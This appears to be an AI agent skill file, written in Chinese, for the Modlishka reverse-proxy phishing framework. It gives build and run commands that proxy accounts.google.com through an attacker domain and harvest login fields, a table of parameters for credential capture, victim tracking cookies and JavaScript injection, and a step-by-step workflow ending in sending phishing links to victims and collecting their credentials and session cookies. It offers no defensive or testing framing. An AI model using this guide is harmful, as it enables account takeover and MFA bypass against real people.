---
name: modlishka
description: >
  此技能适用于用户询问关于 "modlishka"、"针对 OTP 进行网络钓鱼活动"、
  "通过在受害者与真实站点之间充当透明中间人来绕过双因素认证/多因素认证" 的问题。
---

# Modlishka

可绕过双因素认证/多因素认证 (2FA/MFA) 的反向代理钓鱼框架。

## 快速开始

```bash
git clone https://github.com/drk1wi/Modlishka && cd Modlishka && make

./Modlishka -target https://accounts.google.com \
  -phishing phish.attacker.com \
  -cert cert.pem -key key.pem \
  -credParams username=,password=

./Modlishka -config config.json
```

## 核心参数

| 参数 | 用途 |
|------|---------|
| `-target` | 被代理的真实站点 |
| `-phishing` | 攻击者的钓鱼域名 |
| `-cert / -key` | TLS 证书路径 |
| `-credParams` | 要收割的表单字段名 |
| `-trackingCookie` | 受害者追踪 Cookie 名称 |
| `-jsRules` | JavaScript 注入规则 |
| `-config` | JSON 配置文件路径 |

## 操作流程

1. 注册钓鱼域名并获取 TLS 证书（Let's Encrypt）
2. 填写 `config.json`，设置目标站点、域名和 TLS 路径
3. 启动 Modlishka；将钓鱼 URL 发送给受害者
4. 在 `http://127.0.0.1:8888` 的监控面板查看已捕获的凭据和会话 Cookie

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | 配置模板、操作面板使用说明 |
